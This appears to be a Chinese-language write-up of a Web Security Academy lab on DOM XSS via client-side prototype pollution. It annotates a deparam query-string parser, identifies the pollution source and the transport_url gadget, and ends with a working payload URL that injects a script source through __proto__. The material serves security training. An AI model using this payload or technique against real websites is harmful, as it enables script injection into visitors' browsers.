# 实验室：通过客户端原型污染实现 DOM XSS

本实验室存在通过客户端原型污染导致的 DOM XSS 漏洞。要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的源。
2. 识别一个允许执行任意 JavaScript 的小工具属性。
3. 结合这两者以调用 `alert()`。

你可以手动在浏览器中解决此实验，也可以使用 [DOM Invader](/burp/documentation/desktop/tools/dom-invader) 作为辅助。

        ```js
            try {
        ```

- 查看 deparam JS 代码


    - 响应
        ```js
        // 仅被 searchLogger 函数调用
        //// 参数 coerce 未被设置
        var deparam = function(params, coerce) {
            var obj = {},
                coerce_types = {
                    'true': !0,
                    'false': !1,
                    'null': null
                };

            if (!params) {
                return obj;
            }

            // params => v
            // 替换 `+` 到空格，使用参数分隔符切分为列表，遍历参数
            params.replace(/\+/g, ' ').split('&').forEach(function(v) {
                // v => param
                // 对每个参数，拆分名值对
                // param[0] => key
                var param = v.split('='),
                    key = decodeURIComponent(param[0]),
                    val,
                    cur = obj,
                    i = 0,

                    // key => keys
                    // 拆分中间索引字符串 `[a][b]` => `[a`, `b]`
                    keys = key.split(']['),
                    keys_last = keys.length - 1;
                
                // 若存在中间索引字符串，移除末尾与开头的索引字符
                if (/\[/.test(keys[0]) && /\]$/.test(keys[keys_last])) {
                    keys[keys_last] = keys[keys_last].replace(/\]$/, '');
                    keys = keys.shift().split('[').concat(keys);
                    keys_last = keys.length - 1;
                } else {
                    keys_last = 0;
                }

                // 若参数存在值，进行 URL 解码
                if (param.length === 2) {
                    val = decodeURIComponent(param[1]);

                    // 若未被设置的函数参数 coerce 存在
                    if (coerce) {
                        // 若参数值为数字字符串，隐式类型转换到数字，再隐式类型转换到字符串。确保变量类型为数字型字符串
                        // 若为数字型字符串，则返回数字
                        // 若为未定义字符串则返回未定义
                        // 若非未定义则返回 true, false, null
                        // 否则返回字符串
                        val = val && !isNaN(val) && ((+val + '') === val) ? +val // number
                            :
                            val === 'undefined' ? undefined // undefined
                            :
                            coerce_types[val] !== undefined ? coerce_types[val] // true, false, null
                            :
                            val; // string
                    }

                    // 若存在多个索引 key，遍历
                    if (keys_last) {
                        for (; i <= keys_last; i++) {
                            // 若为空，返回 cur 字典元素数量
                            // 否则，返回当前 key
                            key = keys[i] === '' ? cur.length : keys[i];
                            // cur 字典使用当前长度或非空 key 作为名，设置值
                            // 对于中间 key 
                            //// 若字典已存在当前 key 的值，则返回
                            //// 否则根据下一个 key 是否为数字返回空字典或列表
                            // 对于末尾 key，返回参数值字符串
                            cur = cur[key] = i < keys_last ?
                                cur[key] || (keys[i + 1] && isNaN(keys[i + 1]) ? {} : []) :
                                val;
                        }
                    // 若不存在多索引 key
                    } else {
                        // 若字典 obj 的 key 对应值的类型为列表，则添加值到此列表中
                        if (Object.prototype.toString.call(obj[key]) === '[object Array]') {
                            obj[key].push(val);
                        
                        // 否则，字典 obj 已拥有 key 作为属性，设置已存在的值与新值为 key 的列表
                        } else if ({}.hasOwnProperty.call(obj, key)) {
                            obj[key] = [obj[key], val];
                        // 否则，设置字典 obj 的名值对
                        // ** 对象原型污染源 **
                        } else {
                            obj[key] = val;
                        }
                    }

                // 若不存在参数值，设置字典 obj 的 key
                //// 当 coerce 存在时，为 undefined
                //// 不存在时，为空字符串
                } else if (key) {
                    obj[key] = coerce ?
                        undefined :
                        '';
                }
            });

            return obj;
        };
        ```
        - 仅传入查询参数字符串的名值对，即可进入对象原型污染源。

基于 JS 代码分析，构造原型污染
- 输入源
    查询参数名值对
- 污染源
    ```js
    obj[key] = val;
    ```
    - 此处 obj 为 `{}` 对象实例，仅需一次原型属性访问
- 工具
    `config.transport_url` 属性 
- 汇
    `<script src=载荷`

- 构造 URL 载荷
    `https://id.web-security-academy.net/?__proto__[transport_url]=data:javascript,alert();`
